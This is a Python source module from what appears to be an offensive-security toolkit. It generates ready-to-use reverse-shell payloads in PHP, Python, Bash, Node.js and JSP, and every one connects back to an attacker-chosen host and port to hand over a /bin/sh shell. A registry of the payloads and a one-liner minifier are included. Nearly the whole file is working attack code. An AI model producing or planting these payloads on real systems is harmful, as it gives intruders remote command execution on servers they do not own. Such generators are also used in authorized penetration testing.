"""Payload generation and encoding."""

from __future__ import annotations
from abc import ABC, abstractmethod
from typing import Optional
import base64
import urllib.parse


class Payload(ABC):
    """Base class for all payloads."""
    
    name: str = "generic"
    description: str = ""
    language: str = "php"
    payload_type: str = "revshell"  # revshell | bind_shell | web_exec | download_exec
    
    def __init__(self, lhost: str = "127.0.0.1", lport: int = 4444):
        self.lhost = lhost
        self.lport = lport
    
    @abstractmethod
    def generate(self) -> str:
        """Return the rendered payload string."""
        ...
    
    @property
    def one_liner(self) -> str:
        """Return minified/single-line version of the payload."""
        return self.generate().replace("\n", "").replace("\r", "")


class RevShellPHP(Payload):
    name = "revshell_php"
    description = "PHP reverse shell (classic). Connects back to LHOST:LPORT"
    language = "php"
    payload_type = "revshell"
    
    def generate(self) -> str:
        return f'''<?php
set_time_limit(0);
$ip = '{self.lhost}';
$port = {self.lport};
$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>'''


class RevShellPython(Payload):
    name = "revshell_python"
    description = "Python reverse shell"
    language = "python"
    payload_type = "revshell"
    
    def generate(self) -> str:
        return f'''python3 -c '
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{self.lhost}",{self.lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
'''


class RevShellBash(Payload):
    name = "revshell_bash"
    description = "Bash reverse shell"
    language = "bash"
    payload_type = "revshell"
    
    def generate(self) -> str:
        return f'''bash -c 'exec bash -i &>/dev/tcp/{self.lhost}/{self.lport} <&1' '''


class RevShellNode(Payload):
    name = "revshell_node"
    description = "Node.js reverse shell"
    language = "node"
    payload_type = "revshell"
    
    def generate(self) -> str:
        return f'''require("child_process").exec(
  "bash -c 'exec bash -i &>/dev/tcp/{self.lhost}/{self.lport} <&1'"
)'''


class RevShellJSP(Payload):
    name = "revshell_jsp"
    description = "JSP reverse shell"
    language = "jsp"
    payload_type = "revshell"
    
    def generate(self) -> str:
        return f'''<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%
class StreamConnector extends Thread {{
    InputStream is;
    OutputStream os;
    StreamConnector(InputStream is, OutputStream os) {{
        this.is = is;
        this.os = os;
    }}
    public void run() {{
        try {{
            int c;
            while((c = is.read()) >= 0)
                os.write(c);
        }} catch(Exception e) {{}}
    }}
}}
try {{
    Socket s = new Socket("{self.lhost}", {self.lport});
    Process p = Runtime.getRuntime().exec("/bin/sh");
    new StreamConnector(p.getInputStream(), s.getOutputStream()).start();
    new StreamConnector(s.getInputStream(), p.getOutputStream()).start();
}} catch(Exception e) {{}}
%>'''


# Payload registry
_PAYLOADS: dict[str, type[Payload]] = {
    "revshell_php": RevShellPHP,
    "revshell_python": RevShellPython,
    "revshell_bash": RevShellBash,
    "revshell_node": RevShellNode,
    "revshell_jsp": RevShellJSP,
}


def get_payload(name: str) -> Optional[type[Payload]]:
    return _PAYLOADS.get(name)


def list_payloads() -> list[str]:
    return list(_PAYLOADS.keys())
